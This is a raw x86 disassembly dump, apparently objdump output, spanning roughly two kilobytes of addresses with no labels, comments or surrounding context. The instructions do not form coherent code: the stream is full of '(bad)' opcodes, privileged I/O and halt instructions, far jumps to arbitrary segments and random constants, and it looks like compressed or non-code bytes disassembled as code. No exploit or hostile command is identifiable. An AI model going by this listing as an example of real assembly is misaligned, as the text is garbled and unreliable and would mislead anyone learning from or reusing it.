  4169ff:	adc    edx,DWORD PTR [eax]
  416a01:	sbb    dh,BYTE PTR [esp+esi*4]
  416a04:	inc    ebx
  416a05:	mov    DWORD PTR [ecx+0x1f5a361a],ebp
  416a0b:	xor    edi,ebx
  416a0d:	ret    0x6b85
  416a10:	pop    ss
  416a11:	push   eax
  416a12:	inc    BYTE PTR [ecx+0x24c914a1]
  416a18:	push   esi
  416a19:	or     DWORD PTR [ebx],ebx
  416a1b:	iret   
  416a1c:	inc    esi
  416a1d:	lock sub al,0x4
  416a20:	das    
  416a21:	inc    ebx
  416a22:	dec    ebx
  416a23:	xor    ebp,DWORD PTR [eax+0x6c]
  416a26:	jno    0x416a33
  416a28:	xchg   ebx,eax
  416a29:	push   esp
  416a2a:	cwde   
  416a2b:	xchg   ecx,eax
  416a2c:	xor    ebx,edx
  416a2e:	sbb    eax,0xb0d7af4f
  416a33:	or     ebp,DWORD PTR [eax+eiz*2+0x37a274f8]
  416a3a:	pop    ecx
  416a3b:	sub    dl,ch
  416a3d:	sbb    al,0xe1
  416a3f:	div    DWORD PTR ds:0xe1da6e9c
  416a45:	and    DWORD PTR [edx],esp
  416a47:	in     al,0x88
  416a49:	mov    eax,0x54a55f28
  416a4e:	hlt    
  416a4f:	pop    ebx
  416a50:	jb     0x416acc
  416a52:	push   cs
  416a53:	popa   
  416a54:	xor    dl,BYTE PTR [ebx]
  416a56:	aam    0x7b
  416a58:	sbb    al,0xe4
  416a5a:	inc    edi
  416a5b:	scas   eax,DWORD PTR es:[edi]
  416a5c:	mov    ebp,0xd3b01aa6
  416a61:	ficomp WORD PTR ds:0x50c0d5cb
  416a67:	loope  0x416a72
  416a69:	mov    bh,0xc
  416a6b:	mov    edi,0xaecc
  416a70:	add    BYTE PTR [eax],al
  416a72:	call   0xfb7c3508
  416a77:	jnp    0x416a71
  416a79:	sar    DWORD PTR [edx-0x470c478b],cl
  416a7f:	mov    ds:0xe849607c,eax
  416a84:	add    BYTE PTR [eax],al
  416a86:	hlt    
  416a87:	add    al,0x0
  416a89:	add    BYTE PTR [ebx],ch
  416a8b:	add    bl,BYTE PTR [ecx]
  416a8d:	cmp    eax,DWORD PTR [eax]
  416a8f:	cdq    
  416a90:	test   al,0x1
  416a92:	xchg   eax,ebp
  416a94:	mov    ss,WORD PTR [edi]
  416a96:	cli    
  416a97:	xchg   ebx,eax
  416a98:	pop    ecx
  416a99:	mov    bh,0x75
  416a9b:	(bad)  
  416a9c:	xor    eax,0xd8c5c44d
  416aa1:	test   eax,0xe8caf55d
  416aa6:	fist   DWORD PTR [edx+ecx*8]
  416aa9:	imul   esi,DWORD PTR [edi-0x34e53c62],0x73
  416ab0:	cwde   
  416ab1:	add    al,0xd7
  416ab3:	mov    ds,edx
  416ab5:	js     0x416a79
  416ab7:	hlt    
  416ab8:	sub    al,0x69
  416aba:	lea    ecx,[edi+0x41]
  416abd:	pop    ds
  416abe:	aad    0x5c
  416ac0:	arpl   bp,cx
  416ac2:	daa    
  416ac3:	jge    0x416aa2
  416ac5:	mov    esi,0x19001a83
  416aca:	dec    esi
  416acb:	or     ch,BYTE PTR [ebp+0x60]
  416ace:	push   cs
  416acf:	push   0xd7f843ea
  416ad4:	mov    ecx,esp
  416ad6:	xchg   ebx,eax
  416ad7:	rol    esp,cl
  416ad9:	hlt    
  416ada:	pop    edx
  416adb:	shl    BYTE PTR [esi+0x6c21c4f1],0x6d
  416ae2:	aam    0x11
  416ae4:	lods   eax,DWORD PTR ds:[esi]
  416ae5:	leave  
  416ae6:	frstor [eax]
  416ae8:	xor    eax,0xa5af13ac
  416aed:	adc    cl,BYTE PTR [esi]
  416aef:	pop    ebx
  416af0:	jb     0x416ac2
  416af2:	add    bh,dl
  416af4:	and    edi,DWORD PTR [ebp+0x17]
  416af7:	loopne 0x416b56
  416af9:	out    0x48,al
  416afb:	sbb    eax,0xe03fe180
  416b00:	mov    ebx,0xe4ccea5e
  416b05:	xchg   esp,eax
  416b06:	and    eax,edi
  416b08:	les    edx,FWORD PTR [edx+esi*8]
  416b0b:	inc    esp
  416b0c:	sub    ebx,DWORD PTR ds:0xa628ebee
  416b12:	popf   
  416b13:	or     dl,bh
  416b15:	fisttp DWORD PTR ds:0xad1cb8bc
  416b1b:	or     bh,BYTE PTR [edx+0x28]
  416b1e:	js     0x416b14
  416b20:	cli    
  416b21:	repz fucom st(4)
  416b24:	mov    esi,0xabaf9fce
  416b29:	push   0x5f9977e3
  416b2e:	pop    esp
  416b2f:	push   es
  416b30:	mov    eax,esi
  416b32:	xor    ecx,esp
  416b34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b35:	std    
  416b36:	push   0xffffffa0
  416b38:	shl    DWORD PTR [esi-0x15],cl
  416b3b:	bswap  edi
  416b3d:	sbb    dl,BYTE PTR [esi+0x21]
  416b40:	xor    al,0x9
  416b42:	cmp    eax,0xfa685b1a
  416b47:	push   esp
  416b48:	(bad)  [edi+0x6c]
  416b4b:	add    DWORD PTR [ecx+0xd214fa1],ecx
  416b51:	fidivr WORD PTR [ecx+eiz*8]
  416b54:	xchg   bh,al
  416b56:	dec    esi
  416b57:	push   esp
  416b58:	popf   
  416b59:	adc    DWORD PTR [edi],esp
  416b5b:	pop    eax
  416b5c:	(bad)  
  416b5e:	gs mov al,0x8f
  416b61:	sub    DWORD PTR [ebx+0x7ab05a3f],edi
  416b67:	mov    ds:0x4cab9544,al
  416b6c:	in     eax,0xfe
  416b6e:	fdivr  DWORD PTR [edi+0x3716e481]
  416b74:	mov    ?,WORD PTR [si-0x40]
  416b78:	or     al,0x12
  416b7a:	dec    ebx
  416b7b:	jae    0x416b04
  416b7d:	call   0x8db9c67f
  416b82:	or     edx,0x1f
  416b85:	fisub  WORD PTR [eax-0x21]
  416b88:	push   0xffffff9d
  416b8a:	mov    eax,esp
  416b8c:	push   ecx
  416b8d:	inc    esi
  416b8e:	mov    ch,ah
  416b90:	or     al,0x4c
  416b92:	pop    es
  416b93:	dec    edx
  416b94:	iret   
  416b95:	sub    cl,cl
  416b97:	adc    eax,0xa9592125
  416b9c:	bound  ecx,QWORD PTR ds:0x13fdd9
  416ba2:	add    BYTE PTR [eax],dh
  416ba4:	sbb    edx,esi
  416ba6:	jns    0x416b9e
  416ba8:	sub    al,0xe7
  416baa:	pushf  
  416bab:	inc    ebx
  416bac:	sbb    ecx,DWORD PTR [ebp-0x5809d405]
  416bb2:	push   cs
  416bb3:	xchg   ebx,eax
  416bb4:	dec    ebx
  416bb5:	out    0x9b,eax
  416bb7:	xor    ecx,edi
  416bb9:	ficomp WORD PTR [ebp-0x776303e6]
  416bbf:	inc    esi
  416bc0:	adc    esp,ecx
  416bc2:	pop    esp
  416bc3:	popw   ss
  416bc5:	mov    WORD PTR [edx+0x31c025d0],cs
  416bcb:	fwait
  416bcc:	push   esi
  416bcd:	adc    dh,bl
  416bcf:	(bad)  
  416bd0:	jmp    0x369c62aa
  416bd5:	inc    eax
  416bd6:	sub    DWORD PTR [eax+0x0],ebx
  416bd9:	dec    BYTE PTR [ebp-0x30]
  416bdc:	ds dec esi
  416bde:	test   al,0x4
  416be0:	mov    edi,0x6c1cb955
  416be5:	push   ds
  416be6:	fidiv  WORD PTR [edx+0x8ab74df]
  416bec:	sahf   
  416bed:	and    BYTE PTR [ebx+ecx*1],0x5c
  416bf1:	push   es
  416bf2:	scas   al,BYTE PTR es:[edi]
  416bf3:	jmp    0xc02a3a72
  416bf8:	mov    ecx,0xcaf7c26
  416bfd:	dec    esp
  416bfe:	inc    eax
  416bff:	test   BYTE PTR [edi-0x5003db86],bh
  416c05:	push   ss
  416c06:	(bad)
  416c09:	dec    eax
  416c0a:	sbb    ah,bh
  416c0c:	pop    ebx
  416c0d:	stos   BYTE PTR es:[edi],al
  416c0e:	rol    BYTE PTR [eax],1
  416c10:	leave  
  416c11:	and    BYTE PTR [eax],ah
  416c13:	outs   dx,BYTE PTR ds:[esi]
  416c14:	xor    al,0x90
  416c16:	push   es
  416c17:	fld    QWORD PTR [edx*1-0x1fc59c26]
  416c1e:	(bad)  [ecx-0x1c]
  416c21:	or     cl,BYTE PTR [edx-0x675bf944]
  416c27:	and    al,0xaf
  416c29:	adc    eax,0xbc082669
  416c2e:	jecxz  0x416bfe
  416c30:	adc    BYTE PTR [esi+0x7f4c4074],bh
  416c36:	icebp  
  416c37:	xlat   BYTE PTR ds:[ebx]
  416c38:	mov    ebx,0x1fee7495
  416c3d:	mov    edx,DWORD PTR [ebp-0xcb67a2b]
  416c43:	sahf   
  416c44:	test   ebp,esp
  416c46:	fcmovnu st,st(3)
  416c48:	ret    0x334a
  416c4b:	push   0xffffffdd
  416c4d:	push   edi
  416c4e:	mov    edi,0x17c66f82
  416c53:	das    
  416c54:	jb     0x416c31
  416c56:	retf   0x30c6
  416c59:	inc    edx
  416c5a:	(bad)  
  416c5b:	ror    BYTE PTR [ebx],0x9f
  416c5e:	cld    
  416c5f:	mov    bh,bl
  416c61:	lods   eax,DWORD PTR ds:[esi]
  416c62:	test   DWORD PTR [edi+0x19f8bf76],ebp
  416c68:	retf   
  416c69:	ins    DWORD PTR es:[edi],dx
  416c6a:	ja     0x416c78
  416c6c:	and    al,0x42
  416c6e:	das    
  416c6f:	sub    eax,ecx
  416c71:	push   0x193754f
  416c76:	aaa    
  416c77:	das    
  416c78:	push   ecx
  416c79:	out    0xd5,eax
  416c7b:	stos   DWORD PTR es:[edi],eax
  416c7c:	sub    DWORD PTR [eax+ecx*2+0x54],ebx
  416c80:	xchg   ebp,eax
  416c81:	ins    BYTE PTR es:[edi],dx
  416c82:	add    ah,al
  416c84:	push   edi
  416c85:	lahf   
  416c86:	push   ds
  416c87:	xchg   ecx,eax
  416c88:	and    DWORD PTR [ebp+0x23],ebp
  416c8b:	sbb    ebx,eax
  416c8d:	cs fs in al,0xc6
  416c91:	cmp    BYTE PTR [ebx-0x28],bl
  416c94:	push   cs
  416c95:	push   ss
  416c96:	and    BYTE PTR [edi],dl
  416c98:	retf   
  416c99:	cmp    al,0x30
  416c9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c9c:	lock ja 0x416c88
  416c9f:	pop    esi
  416ca0:	fiadd  DWORD PTR [edx+esi*4-0x5e]
  416ca4:	test   eax,0x7549e223
  416ca9:	mov    eax,ds:0x7699b84d
  416cae:	ja     0x416cda
  416cb0:	or     edi,DWORD PTR [eax-0x68b7e2ad]
  416cb6:	pop    ebx
  416cb7:	lds    ecx,FWORD PTR [si]
  416cba:	mov    esi,DWORD PTR [ecx+0x323c7057]
  416cc0:	inc    ebp
  416cc1:	mov    ecx,0x531a2044
  416cc6:	mov    bh,0x60
  416cc8:	std    
  416cc9:	cld    
  416cca:	mov    bh,0xbb
  416ccc:	js     0x416ca2
  416cce:	cmp    al,0x91
  416cd0:	lahf   
  416cd1:	popf   
  416cd2:	xchg   ebx,eax
  416cd3:	jnp    0x416d2d
  416cd5:	lods   al,BYTE PTR ds:[esi]
  416cd6:	cld    
  416cd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cd8:	pop    edi
  416cd9:	dec    edi
  416cda:	or     eax,0x1f859938
  416cdf:	mov    al,0x2d
  416ce1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ce2:	mov    ebx,0x929c3a0
  416ce7:	lea    edx,[ebx+0x1d]
  416cea:	xlat   BYTE PTR ds:[ebx]
  416ceb:	inc    ebp
  416cec:	jmp    0xc75:0xca025f22
  416cf3:	jmp    0x416d2d
  416cf5:	jge    0x416c78
  416cf7:	lahf   
  416cf8:	retf   0x5067
  416cfb:	sub    ecx,DWORD PTR [esi-0x347863ee]
  416d01:	mov    esp,0x9fec88ab
  416d06:	jo     0x416d00
  416d08:	jo     0x416d74
  416d0a:	jl     0x416d61
  416d0c:	ret    0xcf8c
  416d0f:	int3   
  416d10:	add    eax,0x26e934ad
  416d15:	mov    bh,0xb2
  416d17:	pop    es
  416d18:	mov    ah,0xf8
  416d1a:	mov    edx,DWORD PTR [eax+0x37a9c421]
  416d20:	in     eax,dx
  416d21:	push   es
  416d22:	or     eax,0xfd1fabd8
  416d27:	cld    
  416d28:	mov    ebp,DWORD PTR [ebx-0x6d]
  416d2b:	leave  
  416d2c:	jge    0x416cfd
  416d2e:	stos   DWORD PTR es:[edi],eax
  416d2f:	or     eax,0x4b851076
  416d34:	retf   0xfa69
  416d37:	retf   
  416d38:	adc    BYTE PTR [edi-0x68accb2d],bl
  416d3e:	mov    edx,0xfe2e3d5f
  416d43:	or     al,0x89
  416d45:	mov    ds:0x9f97f60e,al
  416d4a:	imul   ecx,DWORD PTR [edi],0xbd942135
  416d50:	xchg   ebx,eax
  416d51:	xchg   ebp,eax
  416d52:	push   ss
  416d53:	je     0x416d18
  416d55:	jge    0x416d3e
  416d57:	scas   eax,DWORD PTR es:[edi]
  416d58:	xchg   ecx,eax
  416d59:	js     0x416cf6
  416d5b:	ror    al,0xf0
  416d5e:	push   ecx
  416d5f:	inc    ecx
  416d60:	icebp  
  416d61:	loopne 0x416d91
  416d63:	aam    0x61
  416d65:	and    eax,0x7ff30f9e
  416d6a:	pop    edx
  416d6b:	mov    ds:0x7fd90010,al
  416d70:	or     ah,bl
  416d72:	(bad)  
  416d73:	retf   
  416d74:	jecxz  0x416d69
  416d76:	adc    BYTE PTR [eax],dh
  416d78:	adc    eax,0xa568e9c0
  416d7d:	ret    0x83c
  416d80:	fstp   QWORD PTR [edi]
  416d82:	add    eax,0xac47f1fd
  416d87:	pop    edi
  416d88:	std    
  416d89:	adc    eax,0x5a772bf0
  416d8e:	xor    eax,0xa5a7eab6
  416d93:	call   0xec32:0x882881d8
  416d9a:	fs jp  0x416e05
  416d9d:	into   
  416d9e:	xor    eax,0xe8d13d4d
  416da3:	push   ss
  416da4:	dec    ebp
  416da5:	mov    WORD PTR [eax+0x18],ss
  416da8:	sti    
  416da9:	add    BYTE PTR [edi-0x72],bh
  416dac:	mov    dh,0x76
  416dae:	popa   
  416daf:	stos   DWORD PTR es:[edi],eax
  416db0:	mov    eax,ds:0xb67abab8
  416db5:	push   edx
  416db6:	jg     0x416d86
  416db8:	add    al,0x47
  416dba:	xchg   ebx,eax
  416dbb:	std    
  416dbc:	xor    bl,BYTE PTR [esi]
  416dbe:	jne    0x416d51
  416dc0:	jmp    0xba779a9f
  416dc5:	jno    0x416e30
  416dc7:	jo     0x416d6b
  416dc9:	pop    esp
  416dca:	nop
  416dcb:	pop    ebx
  416dcc:	iret   
  416dcd:	das    
  416dce:	aas    
  416dcf:	inc    edi
  416dd0:	icebp  
  416dd1:	out    dx,eax
  416dd2:	(bad)  
  416dd3:	fmul   QWORD PTR [eax+0x461a0d39]
  416dd9:	or     eax,0xf9250157
  416dde:	sti    
  416ddf:	test   BYTE PTR [ebp+eax*8+0x6a11b082],dl
  416de6:	push   edx
  416de7:	lods   eax,DWORD PTR ds:[esi]
  416de8:	aam    0x91
  416dea:	fwait
  416deb:	mov    al,ds:0x2af31eab
  416df0:	aam    0x9d
  416df2:	pop    ebp
  416df3:	test   al,0xed
  416df5:	mov    bl,0x5
  416df7:	repnz adc al,0x13
  416dfa:	and    edi,DWORD PTR [edx]
  416dfc:	mov    ds:0x982b7049,eax
  416e01:	loopne 0x416e7d
  416e03:	imul   eax,DWORD PTR [ebp-0x2fd54380],0x3ffc2eb5
  416e0d:	cmp    bh,dl
  416e0f:	test   BYTE PTR [eax],0x52
  416e12:	adc    al,0xb9
  416e14:	test   BYTE PTR [ecx],cl
  416e16:	sbb    ch,ch
  416e18:	jns    0x416e6d
  416e1a:	push   ebx
  416e1b:	shl    DWORD PTR [eax-0xb430aff],0x59
  416e22:	adc    ebp,ecx
  416e24:	mov    dl,0x71
  416e26:	cmp    BYTE PTR [eax+ecx*1-0x6a],cl
  416e2a:	imul   eax,ecx,0x8178b934
  416e30:	cmc    
  416e31:	repnz mov esi,0x320df504
  416e37:	jne    0x416e53
  416e39:	rcl    cl,cl
  416e3b:	jb     0x416df1
  416e3d:	js     0x416df1
  416e3f:	and    DWORD PTR [edi-0x57],edx
  416e42:	scas   al,BYTE PTR es:[edi]
  416e43:	cli    
  416e44:	push   esi
  416e45:	add    BYTE PTR ds:0xa840e686,ah
  416e4b:	mov    ch,0x9e
  416e4d:	xor    BYTE PTR [edx-0x7f],ah
  416e50:	mov    eax,ecx
  416e52:	pop    esi
  416e53:	es or  al,0x9
  416e56:	jae    0x416e95
  416e58:	cmp    DWORD PTR [ebp+0x5660f29d],esi
  416e5e:	xor    BYTE PTR [edx+0x5a],al
  416e61:	std    
  416e62:	inc    edx
  416e63:	cmp    DWORD PTR [ecx],eax
  416e65:	jg     0x416e9f
  416e67:	mov    cl,0x43
  416e69:	in     eax,dx
  416e6a:	inc    esp
  416e6b:	(bad)  
  416e6c:	scas   eax,DWORD PTR es:[edi]
  416e6d:	retf   
  416e6e:	cmc    
  416e6f:	outs   dx,BYTE PTR ds:[esi]
  416e70:	inc    esp
  416e71:	xor    BYTE PTR [edi-0xe4443ba],bh
  416e77:	daa    
  416e78:	sahf   
  416e79:	and    eax,0xe68f6b11
  416e7e:	xchg   edx,edx
  416e80:	mov    esi,0x8cd208c5
  416e85:	add    ch,BYTE PTR [edi-0x2]
  416e88:	adc    DWORD PTR [ecx+0x11],ebx
  416e8b:	test   ah,0x12
  416e8e:	fwait
  416e8f:	cli    
  416e90:	or     bh,cl
  416e92:	mov    ecx,0x9287319a
  416e97:	ret    0x534d
  416e9a:	dec    edi
  416e9b:	fdiv   QWORD PTR [ebx+0x23]
  416e9e:	fld    DWORD PTR [ebp-0x661a3362]
  416ea4:	nop    DWORD PTR [ebx+0x27566c92]
  416eab:	sub    al,0x77
  416ead:	stos   BYTE PTR es:[edi],al
  416eae:	int3   
  416eaf:	add    al,0x88
  416eb1:	adc    cl,cl
  416eb3:	imul   esi,DWORD PTR ds:0x1d61fcae,0x79
  416eba:	jb     0x416e81
  416ebc:	inc    eax
  416ebd:	icebp  
  416ebe:	xor    al,0xf2
  416ec0:	addr16 imul edx,ebp,0x743fdbf3
  416ec7:	mov    ah,0x4c
  416ec9:	fbld   TBYTE PTR [esi-0x4cc9be49]
  416ecf:	fld    TBYTE PTR [ebp-0x64]
  416ed2:	inc    esi
  416ed3:	mov    al,0xa6
  416ed5:	aas    
  416ed6:	scas   al,BYTE PTR es:[edi]
  416ed7:	jmp    0x9b56:0x6ab1022e
  416ede:	les    ebx,FWORD PTR [ecx-0x41]
  416ee1:	or     ch,bh
  416ee3:	aam    0xa1
  416ee5:	sbb    edx,0x9419e34c
  416eeb:	xor    al,0x35
  416eed:	fcmovnb st,st(3)
  416eef:	dec    ebx
  416ef0:	(bad)  
  416ef1:	cmp    eax,0xbf01af01
  416ef6:	push   es
  416ef7:	daa    
  416ef8:	gs mov esi,0xe4fe29ff
  416efe:	stos   BYTE PTR es:[edi],al
  416eff:	mov    esp,0x3a660f14
  416f04:	add    edi,DWORD PTR [edi]
  416f06:	add    eax,0x59a55ae7
  416f0b:	xor    eax,DWORD PTR [eax]
  416f0d:	in     eax,dx
  416f0e:	push   edi
  416f0f:	inc    edx
  416f10:	push   edx
  416f11:	test   BYTE PTR [edx+0x63],al
  416f14:	add    BYTE PTR [ebp+0x47],0xc9
  416f18:	sbb    BYTE PTR [ebp-0xf],ch
  416f1b:	outs   dx,DWORD PTR ds:[esi]
  416f1c:	fldenv [ebx+edi*8]
  416f1f:	outs   dx,DWORD PTR ds:[esi]
  416f20:	retf   0x331d
  416f23:	(bad)  
  416f24:	sub    al,0x73
  416f26:	fnstsw WORD PTR [ebx-0x76]
  416f29:	rol    DWORD PTR [eax-0x72],cl
  416f2c:	sbb    DWORD PTR [edi-0x1e],ecx
  416f2f:	mov    ds:0x58e7befa,eax
  416f34:	stos   DWORD PTR es:[edi],eax
  416f35:	lahf   
  416f36:	(bad)  
  416f37:	cld    
  416f38:	inc    esp
  416f39:	arpl   WORD PTR [ebp-0x77408ae],bx
  416f3f:	es (bad) 
  416f41:	add    BYTE PTR [ebx-0x4f],ah
  416f44:	mov    esp,0x69e921d5
  416f49:	cld    
  416f4a:	cmp    ebx,DWORD PTR [ecx-0x40756ddf]
  416f50:	dec    ebp
  416f51:	stc    
  416f52:	sub    BYTE PTR [edi+0x5],bl
  416f55:	pop    ecx
  416f56:	mov    esp,0x417c4c8b
  416f5b:	mov    al,0x47
  416f5d:	cmp    eax,0x42f02dff
  416f62:	push   edi
  416f63:	inc    esi
  416f64:	xchg   ebx,eax
  416f65:	inc    ebx
  416f66:	pop    es
  416f67:	cmp    esi,eax
  416f69:	mov    eax,ds:0x28f8872e
  416f6e:	and    al,0xca
  416f70:	int    0xaa
  416f72:	ins    BYTE PTR es:[edi],dx
  416f73:	push   ss
  416f74:	mov    al,0x65
  416f76:	shr    dl,cl
  416f78:	adc    ebx,ecx
  416f7a:	xor    eax,0x297b23
  416f7f:	add    BYTE PTR [eax],al
  416f81:	add    BYTE PTR [ebp+0x2c],dl
  416f84:	pop    edi
  416f85:	test   DWORD PTR [edi-0x9],edi
  416f88:	(bad)  
  416f8a:	adc    dh,BYTE PTR [ecx-0x713809da]
  416f90:	mov    ebx,edx
  416f92:	cmp    eax,0xf40000ed
  416f97:	add    al,0x0
  416f99:	add    dh,ch
  416f9b:	loopne 0x416ffc
  416f9d:	or     al,0x3
  416f9f:	inc    edx
  416fa0:	inc    ecx
  416fa1:	dec    ecx
  416fa2:	mov    ds:0x42a345a0,al
  416fa7:	xchg   edx,eax
  416fa8:	lods   eax,DWORD PTR ds:[esi]
  416fa9:	add    esp,eax
  416fab:	inc    ebp
  416fac:	cmp    eax,0x48958183
  416fb1:	lods   eax,DWORD PTR ds:[esi]
  416fb2:	fidiv  WORD PTR [ebx+0x1ddb0dbb]
  416fb8:	and    DWORD PTR [ebx-0x6cce390d],ebx
  416fbe:	in     al,dx
  416fbf:	sbb    DWORD PTR [esi-0x2b],edi
  416fc2:	jecxz  0x416fa1
  416fc4:	jg     0x41700b
  416fc6:	xchg   edi,eax
  416fc7:	sbb    DWORD PTR [edi],ecx
  416fc9:	out    0xbb,al
  416fcb:	shl    DWORD PTR [eax-0x2e],cl
  416fce:	xlat   BYTE PTR ds:[ebx]
  416fcf:	add    eax,0x4a140a0f
  416fd4:	xor    cl,BYTE PTR [edi+eiz*4-0x4]
  416fd8:	dec    ebp
  416fd9:	adc    edx,esi
  416fdb:	sub    cl,BYTE PTR [eax-0x565a01e4]
  416fe1:	inc    ebx
  416fe2:	xchg   ecx,eax
  416fe3:	pop    esp
  416fe4:	lods   al,BYTE PTR ds:[esi]
  416fe5:	inc    ecx
  416fe6:	lea    ecx,[edi-0x1f]
  416fe9:	sub    dl,cl
  416feb:	pop    ds
  416fec:	sub    DWORD PTR [eax+0x397a94dd],eax
  416ff2:	add    ch,BYTE PTR [ebx+edx*1+0x16]
  416ff6:	mov    dh,0x1
  416ff8:	test   dh,0x38
  416ffb:	and    ebp,eax
  416ffd:	mov    esp,0x2aff1d7f
  417002:	mov    esi,es
  417004:	sub    al,0x73
  417006:	mov    ah,0x97
  417008:	sub    BYTE PTR [edx+0x1e],dh
  41700b:	lods   al,BYTE PTR ds:[esi]
  41700c:	repz mov ah,0xe3
  41700f:	les    edi,FWORD PTR [eax]
  417011:	jnp    0x416fec
  417013:	adc    dl,ch
  417015:	int3   
  417016:	sub    al,0xde
  417018:	xchg   edi,eax
  417019:	test   eax,0xee662d28
  41701e:	fs mov dh,0xe
  417021:	clc    
  417022:	sub    bl,cl
  417024:	cld    
  417025:	scas   al,BYTE PTR es:[edi]
  417026:	lahf   
  417027:	xchg   edx,eax
  417028:	jmp    0x17cc5d2e
  41702d:	adc    al,0x74
  41702f:	cmp    BYTE PTR [edi+edi*2-0x6c],ch
  417033:	mov    ch,BYTE PTR ds:0xbf60ec45
  417039:	retf   0x369b
  41703c:	push   edx
  41703d:	(bad)  
  41703f:	mov    ds:0xabd4cd8d,al
  417044:	push   0x75
  417046:	sbb    al,0x1d
  417048:	test   al,0x6b
  41704a:	imul   esp,DWORD PTR [ebp-0x3d],0xe5adbe06
  417051:	push   0xce10c96c
  417056:	test   al,0x5a
  417058:	mov    ecx,0x8cfdb23e
  41705d:	out    dx,eax
  41705e:	js     0x4170cc
  417060:	jae    0x41707b
  417062:	add    eax,0xada9fdfa
  417067:	adc    eax,0xbe672ccc
  41706c:	jmp    esp
  41706e:	jb     0x417091
  417070:	and    bh,dh
  417072:	stos   DWORD PTR es:[edi],eax
  417073:	or     al,0x84
  417075:	inc    edi
  417076:	xchg   edx,eax
  417077:	idiv   edi
  417079:	in     al,0xd9
  41707b:	repnz scas al,BYTE PTR es:[edi]
  41707d:	lods   al,BYTE PTR ds:[esi]
  41707e:	ins    DWORD PTR es:[edi],dx
  41707f:	(bad)  
  417080:	ins    DWORD PTR es:[edi],dx
  417081:	shr    ah,0x6a
  417084:	or     edx,DWORD PTR [edx]
  417086:	and    edi,ebp
  417088:	xchg   esp,eax
  417089:	fidivr WORD PTR ds:0xabb40717
  41708f:	sub    eax,0x35cca1eb
  417094:	stos   BYTE PTR es:[edi],al
  417095:	push   ebx
  417096:	xchg   esi,eax
  417097:	das    
  417098:	and    BYTE PTR [esi+eiz*8],0x21
  41709c:	cmp    esi,DWORD PTR [edx]
  41709e:	sbb    dh,BYTE PTR [edx-0x13a95065]
  4170a4:	xchg   edx,eax
  4170a5:	out    dx,eax
  4170a6:	dec    eax
  4170a7:	mov    edx,0x9decb39d
  4170ac:	aas    
  4170ad:	push   cs
  4170ae:	pusha  
  4170af:	cs clc 
  4170b1:	arpl   WORD PTR [edi-0x6],dx
  4170b4:	inc    eax
  4170b5:	add    DWORD PTR [edi-0x3756d051],ebp
  4170bb:	(bad)  
  4170bc:	popf   
  4170bd:	pop    ds
  4170be:	sbb    edi,0xa51345cd
  4170c4:	mov    cs,WORD PTR ds:0x59e059ce
  4170ca:	outs   dx,DWORD PTR ds:[esi]
  4170cb:	push   eax
  4170cc:	or     al,BYTE PTR [ebx-0x59]
  4170cf:	jg     0x417073
  4170d1:	inc    esp
  4170d2:	shl    DWORD PTR ss:[ebp+0x3d5d8913],cl
  4170d9:	jmp    0x95922cdb
  4170de:	push   esp
  4170df:	stos   BYTE PTR es:[edi],al
  4170e0:	mov    al,0xba
  4170e2:	dec    ebp
  4170e3:	(bad)  
  4170e5:	xchg   esi,eax
  4170e6:	sar    edi,cl
  4170e8:	sbb    eax,0xa28baea8
  4170ed:	test   DWORD PTR [ecx+0x24],ecx
  4170f0:	int3   
  4170f1:	push   ebx
  4170f2:	or     eax,0x55cde6e
  4170f7:	and    ah,bh
  4170f9:	mov    dl,0x1a
  4170fb:	cmp    eax,0xd64c2f84
  417100:	push   edx
  417101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417102:	jmp    0x665d:0x2392536f
  417109:	ficomp DWORD PTR [ebx-0x41]
  41710c:	retf   0x336f
  41710f:	xor    edx,DWORD PTR [ebx]
  417111:	icebp  
  417112:	or     ebp,DWORD PTR [eax+0x4a]
  417115:	mov    DWORD PTR es:[ecx+0x61],edx
  417119:	push   ebx
  41711a:	cwde   
  41711b:	iret   
  41711c:	or     edi,edx
  41711e:	jmp    DWORD PTR [edx+0x4a]
  417121:	adc    DWORD PTR [edx+ebx*2],ebp
  417124:	xchg   ecx,eax
  417125:	data16 fld TBYTE PTR [ebx-0x4e526bcc]
  41712c:	fstp   TBYTE PTR [eax+edx*8]
  41712f:	sub    edi,DWORD PTR ds:0xfc17c194
  417135:	pusha  
  417136:	in     eax,0xee
  417138:	int3   
  417139:	mov    ah,0x5d
  41713b:	int3   
  41713c:	mov    edi,0x989e8e4c
  417141:	imul   edi,DWORD PTR [esi],0x8aac0d9
  417147:	xchg   DWORD PTR [ecx+eiz*1-0x3c],ebp
  41714b:	add    al,0xca
  41714d:	sbb    BYTE PTR [ebp+0x42c35064],cl
  417153:	pusha  
  417154:	xchg   ebp,eax
  417155:	rcl    DWORD PTR [esi],0xc7
  417158:	test   BYTE PTR [edx-0x73],ch
  41715b:	das    
  41715c:	loop   0x41718c
  41715e:	(bad)  
  41715f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417160:	test   DWORD PTR [eax],ecx
  417162:	sbb    BYTE PTR [ebp+0x1b],ch
  417165:	and    al,0x86
  417167:	jns    0x41710e
  417169:	cmc    
  41716a:	out    0x95,eax
  41716c:	call   0xf624:0x9b21b091
  417173:	outs   dx,DWORD PTR ds:[esi]
  417174:	pop    ds
  417175:	sbb    bl,BYTE PTR [esp+edx*2+0x7631f4d5]
  41717c:	int3   
  41717d:	add    DWORD PTR ds:0x900d0a2,ebp
  417183:	not    DWORD PTR [esi-0x2a]
  417186:	xchg   esp,eax
  417187:	and    ch,bh
  417189:	pop    esp
  41718a:	(bad)  
  41718b:	arpl   si,di
  41718d:	mov    cl,0x6c
  41718f:	popa   
  417190:	xchg   esp,eax
  417191:	mov    cl,0x59
  417193:	daa    
  417194:	add    al,0x98
  417196:	xor    ebp,DWORD PTR [edi+0x50]
  417199:	push   esi
  41719a:	test   DWORD PTR [edi+0x20],edx
  41719d:	mov    BYTE PTR [esi+ebx*2-0x6e],cl
  4171a1:	aad    0x50
  4171a3:	xchg   esp,edx
  4171a5:	(bad)  
  4171a6:	shr    ecx,cl
  4171a8:	out    dx,eax
  4171a9:	cmp    BYTE PTR [edx],al
  4171ab:	bound  ecx,QWORD PTR [ebp-0x630f4c83]
  4171b1:	out    0x14,eax
  4171b3:	fprem1 
  4171b5:	imul   eax,DWORD PTR [eax+0x75ff9406],0x40cb4a46
  4171bf:	mov    es,WORD PTR [esi]
  4171c1:	sub    esi,0x18
